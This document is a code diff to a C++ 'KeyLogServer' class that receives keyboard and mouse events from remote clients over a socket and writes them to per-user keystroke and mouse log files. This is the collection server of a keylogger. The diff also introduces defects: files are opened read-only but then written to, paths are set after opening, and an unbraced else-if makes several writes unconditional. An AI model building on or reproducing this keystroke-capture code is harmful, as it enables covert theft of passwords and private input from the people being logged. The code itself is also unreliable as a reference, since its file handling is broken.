@@ -7,6 +7,7 @@
 #include <sys/wait.h>
 #include <time.h>
 #include "async_write.h"
+#include <fcntl.h>
 
 class KeyLogServer {
     int _listening_socket;
@@ -24,30 +25,26 @@ class KeyLogServer {
         
         if (!try_recv(sock_fd, msg, msg_header.size))
             exit(EXIT_FAILURE);
-        //исправить на системный вызов open
-        //open(par1,par2,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH )
-        FILE * file_keyboard = fopen(path_of_keyboard.c_str(),"a+");
-        int fd_async_keyboard = fileno(file_keyboard);
+        auto fd_async_keyboard = open(path_of_keyboard.c_str(), O_APPEND | O_RDONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
 
-        FILE * file_mouse = fopen(path_of_mouse.c_str(),"a+");
-        int fd_async_mouse = fileno(file_mouse);
+        auto fd_async_mouse = open(path_of_mouse.c_str(), O_APPEND | O_RDONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
         path_of_keyboard = msg.user_name + "_keyboard.txt";
         path_of_mouse = msg.user_name + "_mouse.txt";
-        while (msg.action != END) {
-            if (!try_recv(sock_fd, msg))
+        while (msg_header.action != END) {
+            if (!try_recv_header(sock_fd, msg_header))
                 exit(EXIT_FAILURE);
-            
-            if (msg.action == actions::MOUSE) {
+            if(!try_recv(sock_fd, msg, msg_header.size))
+                exit(EXIT_FAILURE);
+
+            if (msg_header.action == actions::MOUSE) {
                 mice.push_back(msg.mice);
             }
-
-            if (mice.size() == 50)
-            {
+            if (mice.size() == 50) {
                 write_vector_async_file(mice, fd_async_mouse);
                 mice.clear();
             }
 
-            if (msg.action == actions::KEYBOARD) {
+            if (msg_header.action == actions::KEYBOARD) {
                 keys.push_back(msg.keys);
             }
 
@@ -56,7 +53,7 @@ class KeyLogServer {
                 write_vector_async_file(keys, fd_async_keyboard);
                 keys.clear();
             }
-            else if (msg.action == actions::END)
+            else if (msg_header.action == actions::END)
                 write_vector_async_file(keys, fd_async_keyboard);
                 write_vector_async_file(mice, fd_async_mouse);
                 keys.clear();
